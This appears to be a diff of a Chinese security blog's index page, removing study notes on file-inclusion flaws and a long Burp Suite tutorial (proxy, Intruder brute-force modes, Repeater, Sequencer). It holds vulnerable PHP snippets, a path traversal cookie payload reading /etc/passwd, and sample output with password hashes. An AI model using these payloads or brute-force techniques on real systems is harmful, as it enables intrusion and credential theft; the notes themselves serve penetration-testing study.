-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $file = $_GET[&apos;page&apos;];</span><br><span class="line"></span><br><span class="line">    if($file!=&quot;include.php&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;ERROR:File not found!&quot;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>/usr/share/wfuzz/wordlist/vulns/（Kali集成攻击向量字典）</li>
-</ul>
-<h4 id="2-手动漏洞挖掘–Cookie存在漏洞"><a href="#2-手动漏洞挖掘–Cookie存在漏洞" class="headerlink" title="2. 手动漏洞挖掘–Cookie存在漏洞"></a>2. 手动漏洞挖掘–Cookie存在漏洞</h4><ul>
-<li>代码</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$template = &apos;blue.php&apos;</span><br><span class="line">if( is_set($_COOKIE[&apos;TEMPLATE&apos;]))</span><br><span class="line">    $template = $_COOKIE[&apos;TEMPLATE&apos;]</span><br><span class="line">include (&quot;/home/users/phpguru/template/&quot;.$template)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>攻击</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /vulnerable.php HTTP/1.0</span><br><span class="line">Cookie:TEMPLATE=../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>结果</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content=Type:text/html</span><br><span class="line">Server:Apache</span><br><span class="line"></span><br><span class="line">root:fi3sED95ibqR6:0:1:System Operator:/:/bin/ksh</span><br><span class="line">daemon:*:1:1::/tmp:</span><br><span class="line">phpguru:f8fk3j1oIf31.:182:100:Developer:/home/users/phpguru/:bin/csh</span><br></pre></td></tr></table></figure>
-
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%B8%89)%EF%BC%9ABurpsuite/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/01/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%B8%89)%EF%BC%9ABurpsuite/" itemprop="url">Kali Linux笔记(四十三)：Burpsuite</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-03T18:50:46+08:00">
-                2020-01-03
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-Burpsuite"><a href="#1-Burpsuite" class="headerlink" title="1. Burpsuite"></a>1. Burpsuite</h4><ul>
-<li>Web安全工具中的瑞士军刀</li>
-<li>统一的集成工具发现全部现代WEB安全漏洞</li>
-<li>PortSwigger公司开发（基于JAVA）<ul>
-<li>Burp Free</li>
-<li>Burp Professional</li>
-<li><a href="http://www.portswigger.net" target="_blank" rel="noopener">http://www.portswigger.net</a></li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>▲ Free版本和Professional版本之间的区别是，Free版本没有主动扫描功能</code></pre></blockquote>
-<ul>
-<li>所有的工具共享一个能处理并显示HTTP消息的可扩展框架，模块之间无缝交换信息</li>
-<li>字体（首次启动修改字体）<ul>
-<li>Options → Display → HTTP Message Dispaly → 中文字体</li>
-</ul>
-</li>
-</ul>
-<h4 id="2-Burpsuite-Proxy"><a href="#2-Burpsuite-Proxy" class="headerlink" title="2. Burpsuite Proxy"></a>2. Burpsuite Proxy</h4><ul>
-<li>Options<ul>
-<li>Proxy Listeners（默认监听8080）</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>⭐Banding 监听的端口，可以修改IP作为代理转发   
-⭐Request handing 转发到其他主机，非真正目的地址（Redirect to host/port） 
-▲ Invisible proxy 对于客户端程序不支持代理但走HTTPS协议代理功能的程序。
-1.其原理是欺骗本机的DNS服务器，将所要发送的域名解析成Burpsuite的IP地址，然后通过Burpsuit本机的DNS服务器或者局域网内的解析成对公网的IP地址
-2.但若本机和Burpsuit在同一台机器上，会陷入欺骗，解析本地地址的死循环
-3.需要通过Options → Hostname Resolution去增加解析地址
-▲ Invisible Proxy主机头问题 
-1.When using plain HTTP,a proxy-style request looks like this:
-GET http://example.org/foo.php HTTP/1.1
-Host:example.org
-2.Whereas the corresponding non-proxy-style request looks like this:
-GET:/foo.php HTTP/1.1
-Host:example.org
-不支持代理的Web Application可能多为第二种情况的请求，不包含完整头部的HTTP头部请求，此时可开启环回网卡的Invisible Proxy功能，然后通过Redirect to host/port重定向到需要访问真正的目标地址
-▲ Invisible Proxy多目标域名问题
-可以创建多个环回网卡Lookback，监听多个端口，每个环回网卡都开启Invisible Proxy，然后通过Redirect to host/port重定向到需要访问真正的目标地址
-⭐CA certificate（导入导出）
-1.Export → certificate in DER format
-2.在Proxy情况下，访问http://burp，生成CA certificate</code></pre></blockquote>
-<ul>
-<li>Options<ul>
-<li>Intercept Client Request（默认截断）</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>▲ 默认情况下只有一条规则：File extension
-▲ 请求头发生变化：Automatically uodate Content-Length header when the request is edited</code></pre></blockquote>
-<ul>
-<li>Options<ul>
-<li>Intercept Server Responses（默认不截断）</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>默认情况下只有一条规则：Content type header</code></pre></blockquote>
-<ul>
-<li>Options<ul>
-<li>Intercept WeSockets Messages</li>
-<li>Response Modification</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>▲ 常用的Modification
-Unhide hidden from fields（显示隐藏表单）
-Enable disabled form fields（激活被禁止的表单）
-Remove input field length limits（去除输入限制长度）
-Remove JavaScript from validation（去除JavaScript的验证）
-Remove All JavaScript（去除所有的JavaScript）
-Remove secure flag from cookies（去掉cookies的安全标签）</code></pre></blockquote>
-<ul>
-<li>Options<ul>
-<li>Match and Replace（匹配和替换，Request header match就repalce）</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>▲ 提交数据的自动修改
-Original reequest 原始的请求
-Auto-modified request 修改后的请求</code></pre></blockquote>
-<ul>
-<li>Options<ul>
-<li>SSL Pass Through（加密流量直接通过，不截获代理）</li>
-</ul>
-</li>
-<li>Intercept（截断请求代理，默认不截断返回的流量）<ul>
-<li>Intercept is on（截断代理开启）</li>
-<li>Froward（单步发送信息）</li>
-<li>Drop（丢弃包数据，不发送）</li>
-</ul>
-</li>
-<li>HTTP history（截断代理历史）<ul>
-<li>Request</li>
-<li>Response</li>
-</ul>
-</li>
-<li>Web Socket history（无界面的Web Application，SOCKET长连接） </li>
-</ul>
-<h4 id="3-Burpsuite-Target"><a href="#3-Burpsuite-Target" class="headerlink" title="3. Burpsuite Target"></a>3. Burpsuite Target</h4><ul>
-<li>Site map<ul>
-<li>黑色链接：真正访问的链接/灰色链接：通过爬网爬出来的链接，无进行真正访问</li>
-<li>过滤功能：选择站点 → 右键 → Add to Scope（上方白色横条为过滤功能）</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>▲  过滤：
-过滤在Scope中的内容：Filter by request type → Show only in-scope items
-过滤真正发生请求：Filter by request type → Show only requests items
-过滤有参数的请求:Filter by request type → Show only oarameterised requests
-指定参数进行过滤：Filter by search term → 输入字符串
-过滤网页类型：Filter by MIME type
-过滤访问请求码:Filter by status code
-过滤文件扩展名：Filter by file extension
-过滤高亮显示的网页： 右键高亮选中选项（Highlight） → Filter by abotation → Show only highlighted ietms
-过滤有注释的网页：右键注释选中选项（Add Comment）→ Filter by abotation → Show only commented items</code></pre></blockquote>
-<ul>
-<li>Scope<ul>
-<li>Add to Scope会生成过滤的正则表达式</li>
-<li>Include in Scope（加入Scope）</li>
-<li>Exclude from Scope（排除Scope）</li>
-</ul>
-</li>
-</ul>
-<h4 id="4-Burpsuite-Spider-▲-2020-1-3-新版暂无此扩展"><a href="#4-Burpsuite-Spider-▲-2020-1-3-新版暂无此扩展" class="headerlink" title="4. Burpsuite Spider ▲ 2020.1.3 新版暂无此扩展"></a>4. Burpsuite Spider ▲ 2020.1.3 新版暂无此扩展</h4><ul>
-<li>手动爬网</li>
-<li>自动爬网<ul>
-<li>站点目录 → 右键 → Spider this branch</li>
-</ul>
-</li>
-<li>Control<ul>
-<li>Spider Status（Spider is pause自动爬网暂停/Clear queues清理要爬网队列）</li>
-</ul>
-</li>
-<li>Options<ul>
-<li>Application Login（Prompt for guidance提示）</li>
-<li>Passive Spidering（对手动爬网进行分析）</li>
-<li>Request Headers（请求头格式）</li>
-</ul>
-</li>
-<li>比较不同账号或配置，爬网的内容<ul>
-<li>站点目录 → 右键 → Compare site map</li>
-<li>Use current site map（Site map 1）</li>
-<li>Use all items with resposes/Include in-scope items only</li>
-<li>Load from Burp state file（Site map 2）</li>
-<li>Use all items with resposes/Include in-scope items only</li>
-<li>Request Matching（可以默认）</li>
-<li>Response Comparation（可以默认）</li>
-<li>Sync selection（同步两次选中）</li>
-</ul>
-</li>
-</ul>
-<h4 id="5-Burpsuite-Scanner-▲-2020-1-3-新版暂无此扩展"><a href="#5-Burpsuite-Scanner-▲-2020-1-3-新版暂无此扩展" class="headerlink" title="5. Burpsuite Scanner ▲ 2020.1.3 新版暂无此扩展"></a>5. Burpsuite Scanner ▲ 2020.1.3 新版暂无此扩展</h4><ul>
-<li>主动扫描：站点目录 → 右键 → Actively scan this branch</li>
-<li>Options<ul>
-<li>Attack Insertion Points</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>⭐Place attacks into the following location within requests:
-1.URL parameter values
-2.Body parameter values
-3.Cookies parameter values
-4.parameter name
-5.HTTP headers
-6.AMF string parameter（Adobe Flash脚本注入）
-7.REST-STYLE URL parameters
-⭐Change parameter locations（causes many more scan requests）:
-⭐Skip all tests for these parameters（Add）</code></pre></blockquote>
-<ul>
-<li>Options<ul>
-<li>Active Scanning Engine（主动扫描）</li>
-<li>Active Scanning Optimization（主动扫描选项：Speed（扫描速度）/accuracy（准确性））</li>
-<li>Actvie Scanning Areas（主动扫描类型，默认全选）</li>
-<li>Passive Scanning Areas（被动扫描类型，默认全选）</li>
-</ul>
-</li>
-<li>Scan queue（扫描队列）</li>
-<li>Results（扫描结果）</li>
-</ul>
-<h4 id="6-Burpsuite-Extender"><a href="#6-Burpsuite-Extender" class="headerlink" title="6. Burpsuite Extender"></a>6. Burpsuite Extender</h4><ul>
-<li>BApp Store（商店扩展）</li>
-<li>Entensions（安装的扩展）▲ jython（java访问python的中间组件）</li>
-<li>Options<ul>
-<li>Python Environment/jython Standalone Jar（<a href="http://www.jython.og/downloads.html）" target="_blank" rel="noopener">http://www.jython.og/downloads.html）</a></li>
-<li>cp jython Standalone Jar /root/Desktop</li>
-<li>推荐j2EEScan、CO2（图形化SQLMap）插件</li>
-</ul>
-</li>
-</ul>
-<h4 id="7-Burpsuite-Intruder"><a href="#7-Burpsuite-Intruder" class="headerlink" title="7. Burpsuite Intruder"></a>7. Burpsuite Intruder</h4><ul>
-<li>选取爬取的站点选项Request右键 → Send to Intrude（发送模块）</li>
-<li>Positiors<ul>
-<li>Attcak type</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>⭐Attcak type攻击类型（n比m大）
-1.Sniper：先在第一个变量位置逐一插入，第二个位置不变；再在第二个变量位置逐一插入，第一个变量的位置不变（从指定的字典进行破解，只需要一个字典，总替换次数为m+n次）
-2.Battering ram：在变量的位置上，都放上同样的值，变量上的值是一样的（从指定的字典进行破解，只需要一个字典，总替换次数为m+n次）
-3.Pitchfork：从两个字典中各取出同序号的项目放入到变量的位置，若有一个字典的值结束，则此次破解结束（从指定的字典进行破解，需要两个字典，总替换次数为n次）
-4.Cluster bomb：从第一个字典的第一项开始，尝试第二个字典的所有选项，再从第一个字典的第二项开始，尝试第二个字典的所有选项，以此类推（从指定的字典进行破解，需要两个字典，总替换次数为m*n次）</code></pre></blockquote>
-<ul>
-<li>Positiors<ul>
-<li>打上$$作为变量</li>
-<li>Clear $</li>
-<li>选择变量Add $$</li>
-<li>指定Attcak typ以及字典</li>
-</ul>
-</li>
-<li>Payloads<ul>
-<li>Payload Sets（字典类型）</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>⭐Payload Sets:
-1.Simple list 简单字典
-2.Runtime file 指定字典文件路径
-3.Case modification 大小写的替换
-4.Character blocks 字符块
-5.Number 数字
-6.Datas 日期
-7.Brute force 暴力破解（Character set）
-8.Username generator 用户名生成器（Add fanghong:yuan）
-9.Copy other payload 复制字典文件</code></pre></blockquote>
-<ul>
-<li>Payloads<ul>
-<li>Payload Options【Payload Sets】（选择密码字典文件）</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>⭐Add from list:
-1.Fuzzing-full 常用fuzz字典</code></pre></blockquote>
-<ul>
-<li>Payloads<ul>
-<li>Payload Processing（对Payload进行加工）</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>⭐Add:
-1.Add prefix 添加字典前缀
-2.Add suiffix 添加字典后缀
-3.Match/replace 匹配就替换
-4.Reverse substring 反转字符串
-5.Modify case 修改大小写
-6.Encode 编码
-7.Decode 解码
-8.Hash 哈希</code></pre></blockquote>
-<ul>
-<li>Payloads<ul>
-<li>Payload Encoding（URL-encode these character编码字符）</li>
-</ul>
-</li>
-<li>Options<ul>
-<li>Grap Match（Add Match，默认是Exclude HTTP header，需要去除）</li>
-</ul>
-</li>
-<li>在指定完所有的Intrude选项后，开始Intrude<ul>
-<li>顶部 → Intruder → Start attack</li>
-<li>可选择上方白色横条进行filter/或通过Options中的Grap Match进行匹配</li>
-<li>▲ 基于此项Intruder功能，可以进行页面存在性的Fuzz（指定字典）</li>
-</ul>
-</li>
-</ul>
-<h4 id="8-Burpsuit-Repeater"><a href="#8-Burpsuit-Repeater" class="headerlink" title="8. Burpsuit Repeater"></a>8. Burpsuit Repeater</h4><ul>
-<li>站点目录网页 → 右键 → Send to Repeater</li>
-<li>重放：Request → Go → Response</li>
-<li>更改请求方式：Request/Raw → 右键 → Change request method</li>
-<li>更改body编码：Request/Raw → 右键 → Change body encoding</li>
-<li>转换为curl命令形式：Request/Raw → 右键 → Copy as curl command</li>
-<li>如果为CSRF漏洞存在页面（Request/Raw → 右键）<ul>
-<li>Generate CSRF Poc（生成一份Poc代码文件）</li>
-</ul>
-</li>
-<li>菜单栏 → Reperter<ul>
-<li>Update Content-Length（默认自动调整）</li>
-<li>Unpack gzip/deflate（默认自动解压）</li>
-<li>Follow redirections（重定向）</li>
-<li>Process cookies in redirections（处理Cookies重定向，带取Cookie）</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>⭐Follow redirections:
-1.Never 不跟随重定向（默认）
-2.One-site only 一个站点重定向
-3.In-scope only 一个scope重定向
-4.Always 总是重定向</code></pre></blockquote>
-<h4 id="9-Burpsuit-Sequence"><a href="#9-Burpsuit-Sequence" class="headerlink" title="9. Burpsuit Sequence"></a>9. Burpsuit Sequence</h4><ul>
-<li>删除浏览器的Cookies信息（抓取生成Cookies的过程）</li>
-<li>站点目录网页 → 右键 → Send to Sequence</li>
-<li>Token Location Within Response（令牌选择）<ul>
-<li>如果自动识别：Cookies保存在Cookie中</li>
-<li>如果未自动识别：可通过Custom location进行手动选择序列</li>
-</ul>
-</li>
-<li>Select Live Capture Request<ul>
-<li>Start live caputre（不断请求服务器，请求新生成SessionID进行分析）</li>
-<li>收集SessionID → Analyze now </li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>⭐Analyze（伪随机算法的分析）
-1.Summary → Overall result
-2.Character-level analysis 基于字符层面的分析
-3.Bit-level analysis 基于位层面的分析
-▲ FIPS--美国联邦信息处理标准（Federal Information Processing Standard）</code></pre></blockquote>
-<h4 id="10-Burpsuit-Encode-Decode"><a href="#10-Burpsuit-Encode-Decode" class="headerlink" title="10. Burpsuit Encode/Decode"></a>10. Burpsuit Encode/Decode</h4><ul>
-<li>多层复杂编码，可以绕过过滤机制</li>
-<li>Smart decode（只能解码）</li>
-</ul>
-<h4 id="11-Burpsuit-Compare"><a href="#11-Burpsuit-Compare" class="headerlink" title="11. Burpsuit Compare"></a>11. Burpsuit Compare</h4><ul>
-<li>同之前的Compare</li>
-</ul>
-<h4 id="12-Burpsuit-Options"><a href="#12-Burpsuit-Options" class="headerlink" title="12. Burpsuit Options"></a>12. Burpsuit Options</h4><ul>
-<li>Connections<ul>
-<li>Platform Authentication（表单/Http身份认证等其他认证）</li>
-<li>Upstream Proxy Servers（上游代理服务器）</li>
-<li>SOCKS proxy</li>
-<li>Timeouts（超时时间）</li>
-</ul>
-</li>
-<li>HTTP</li>
-<li>SSL<ul>
-<li>Client SSL Certificates（Web Application需要客户端证书，比如软银）</li>
-<li>Server SSL Certificates（服务器代理，导入证书）</li>
-</ul>
-</li>
-<li>Sessions</li>
-<li>Dispaly</li>
-<li>Misc<ul>
-<li>Logging（记录所有操作过程）</li>
-<li>Scheduled Tasks（定期日期表）</li>
-</ul>
-</li>
-</ul>
-<h4 id="13-Burpsuit-Alerts"><a href="#13-Burpsuit-Alerts" class="headerlink" title="13. Burpsuit Alerts"></a>13. Burpsuit Alerts</h4><h4 id="14-截断代理工具"><a href="#14-截断代理工具" class="headerlink" title="14. 截断代理工具"></a>14. 截断代理工具</h4><ul>
-<li>Paros（最早的截断代理工具）</li>
-<li>Webscrab</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/2/">Next</a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/2/">Next</a>
   </nav>
 
 
@@ -3422,7 +3134,7 @@ Auto-modified request 修改后的请求</code></pre></blockquote>
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">59</span>
+                  <span class="site-state-item-count">61</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
